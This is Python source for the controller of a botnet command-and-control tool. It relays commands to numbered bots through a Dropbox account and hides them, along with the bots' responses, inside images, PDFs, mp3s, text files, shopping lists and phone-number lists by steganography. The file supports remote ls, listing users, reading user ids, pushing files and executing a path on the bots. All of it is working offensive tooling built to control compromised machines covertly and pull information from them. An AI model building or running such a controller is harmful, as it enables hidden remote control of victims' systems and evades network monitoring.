import re
import sys

from stegano import lsb
from utils.dropbox_session import DropboxSession, get_nth_bot_dir
from utils.other import username_chars_shopping_list, CONTENT_DELIMITER, AUDIO_DELIMITER
from utils.system_commands import *

NUMBER_OF_FILES = 5
COUNTER = 1


def hide_message_in_file(input_file_path, output_file_path, message, interval=100):
    with open(input_file_path, 'r') as file:
        content = file.read()

    # Insert the message characters at regular intervals
    hidden_content = ""
    index = 0
    for char in message:
        hidden_content += content[index:index + interval] + char
        index += interval

    # Add the remaining part of the content
    hidden_content += content[index:]

    # Save the modified content to the output file
    with open(output_file_path, 'w') as file:
        file.write(hidden_content)


def concatenate_files_with_name(audio_path, file_path, output_path):
    file_name = os.path.basename(file_path).encode()
    with open(audio_path, 'rb') as audio_file, open(file_path, 'rb') as file, open(output_path, 'wb') as output_file:
        output_file.write(audio_file.read())
        output_file.write(AUDIO_DELIMITER)
        output_file.write(file_name)
        output_file.write(CONTENT_DELIMITER)
        output_file.write(file.read())


def decode_phone_number_to_uid(phone_number):
    # Extract the last four digits of the phone number
    try:
        subscriber_number = phone_number.split('-')[-1]
        uid = int(subscriber_number) - 1000
        return uid
    except (ValueError, IndexError):
        print("Invalid phone number format")
        return None


def decode_shopping_list_to_usernames(shopping_list, item_to_char_map, delimiter='-----'):
    shopping_list = [item.strip() for item in shopping_list.split(',')]
    usernames = []
    current_username = []
    for item in shopping_list:
        if item == delimiter:
            usernames.append(''.join(current_username))
            current_username = []
        else:
            for char, mapped_item in item_to_char_map.items():
                if char == item:
                    current_username.append(mapped_item)
                    break
    return usernames


# Inverting the dictionary for decoding
item_to_char_map = {item: char for char, item in username_chars_shopping_list.items()}


# Exchanges the information via base64 encoded name of the file
def command_w(dropbox_session: DropboxSession, bot_number: int):
    global COUNTER
    # Get a random PDF file
    pdf_file = get_nth_file("./controller/pdfs", COUNTER % NUMBER_OF_FILES)
    # Upload the PDF file
    dropbox_session.upload_file(f"./controller/pdfs/{pdf_file}", f"{get_nth_bot_dir(bot_number)}/{pdf_file}")
    # Wait for the response
    dropbox_session.wait_for_new_file(get_nth_bot_dir(bot_number))
    # Download the shopping list
    dropbox_session.download_file(f'{get_nth_bot_dir(bot_number)}/shopping_list.txt', './controller/temp/shopping_list.txt')
    # Read the contents of the shopping list
    shopping_list_content = read_file_contents("./controller/temp/shopping_list.txt")
    # Decode the shopping list
    usernames = decode_shopping_list_to_usernames(shopping_list_content, item_to_char_map)
    print(usernames)
    # Increase the counter
    COUNTER = COUNTER + 1


# Exchanges the information via encoded messages in images
def command_ls(dropbox_session: DropboxSession, bot_number: int, path: str):
    global COUNTER
    # Get a random png file
    png_file = get_nth_file("./controller/photos", COUNTER % NUMBER_OF_FILES)
    # Hide the path into a picture
    lsb.hide(f'./controller/photos/{png_file}', path).save('./controller/temp/png_encoded.png')
    # Upload the picture
    dropbox_session.upload_file('./controller/temp/png_encoded.png', f'{get_nth_bot_dir(bot_number)}/{png_file}')
    # Wait for the response
    dropbox_session.wait_for_new_file(get_nth_bot_dir(bot_number))
    # Download the response file
    dropbox_session.download_file(f'{get_nth_bot_dir(bot_number)}/lion.png', './controller/temp/lion_encoded.png')
    # Reveal the result of ls
    response = lsb.reveal("./controller/temp/lion_encoded.png")
    # Delete the lion
    dropbox_session.delete_file(f'{get_nth_bot_dir(bot_number)}/lion.png')
    # Print the result
    print(response)
    # Increase the counter
    COUNTER = COUNTER + 1


# Exchanges the information via a list of phone numbers. The uid is encoded in the 69th phone number at the last position
def command_id(dropbox_session: DropboxSession, bot_number: int):
    global COUNTER
    # Upload a random docx file to indicate that id is requested
    docx_file = get_nth_file("./controller/docx", COUNTER % NUMBER_OF_FILES)
    dropbox_session.upload_file(f"./controller/docx/{docx_file}", f"{get_nth_bot_dir(bot_number)}/{docx_file}")
    # Wait for the response
    dropbox_session.wait_for_new_file(get_nth_bot_dir(bot_number))
    # Download the phone_numbers.txt
    dropbox_session.download_file(f'{get_nth_bot_dir(bot_number)}/phone_numbers.txt', './controller/temp/phone_numbers.txt')
    # Read the phone numbers file
    phone_numbers = read_file_contents("./controller/temp/phone_numbers.txt").split("\n")
    # Decode the uid
    uid = decode_phone_number_to_uid(phone_numbers[68])
    # Print the result
    print(uid)


def command_copy(dropbox_session: DropboxSession, bot_number: int, path: str):
    # Get a random mp3 file
    mp3_file = get_nth_file("./controller/mp3s", COUNTER % NUMBER_OF_FILES)
    # Concatenate the path to the file
    concatenate_files_with_name(f"./controller/mp3s/{mp3_file}", path, f'./controller/temp/{mp3_file}')
    # Upload the concatenated mp3 file
    dropbox_session.upload_file(f"./controller/temp/{mp3_file}", f"{get_nth_bot_dir(bot_number)}/{mp3_file}")


# Sends
def command_exec(dropbox_session: DropboxSession, bot_number: int, path: str):
    # Get a random text file
    text_file = get_nth_file("./controller/art", COUNTER % NUMBER_OF_FILES)
    # Encode the path into an innocent looking message
    hide_message_in_file(f"./controller/art/{text_file}", "./controller/temp/txt_hidden.txt", path)
    # Upload the file
    dropbox_session.upload_file("./controller/temp/txt_hidden.txt", f"{get_nth_bot_dir(bot_number)}/shrek_script_{len(path)}.txt")


def get_num_of_bots(dropbox_session: DropboxSession):
    files_list = dropbox_session.get_files_list('')
    pattern = re.compile(r'Documents_\d+')
    count = sum(bool(pattern.match(item)) for item in files_list)
    return count

def serve():
    delete_contents_of_folder("./controller/temp")

    DROPBOX_ACCESS_TOKEN = sys.argv[1]
    dropbox_session = DropboxSession(DROPBOX_ACCESS_TOKEN)
    num_of_bots = get_num_of_bots(dropbox_session)
    print("Conroller is aware of " + str(num_of_bots) + " bots")
    print("To give a command to a bot number X, write \"X: command\". In order to exit, write exit.")

    while True:
        if COUNTER != 0 and COUNTER % NUMBER_OF_FILES == 0:
            print("Cleanup...")
            for i in range(num_of_bots):
                dropbox_session.delete_file(get_nth_bot_dir(i))
                dropbox_session.create_directory(get_nth_bot_dir(i))

        input_str = input("")
        if input_str == "exit":
            break
        try:
            [bot_num, command] = input_str.split(": ")
            bot_num = int(bot_num)
            if bot_num >= num_of_bots:
                print("Invalid bot number. Keep in mind that the bots are on default numbered from 0.")
                continue
            if command.startswith("ls"):
                split_command = command.split(" ")
                path = command.split(" ")[1] if len(split_command) == 2 else "."
                command_ls(dropbox_session, bot_num, path)
            elif command.startswith("w"):
                command_w(dropbox_session, bot_num)
            elif command.startswith("id"):
                command_id(dropbox_session, bot_num)
            elif command.startswith("copy"):
                path = command.split(" ")[1]
                command_copy(dropbox_session, bot_num, path)
            elif command.startswith("exec"):
                path = command.split(" ")[1]
                command_exec(dropbox_session, bot_num, path)
        except ValueError:
            print("Failed to read the command. Try again.")



if __name__ == '__main__':
    serve()
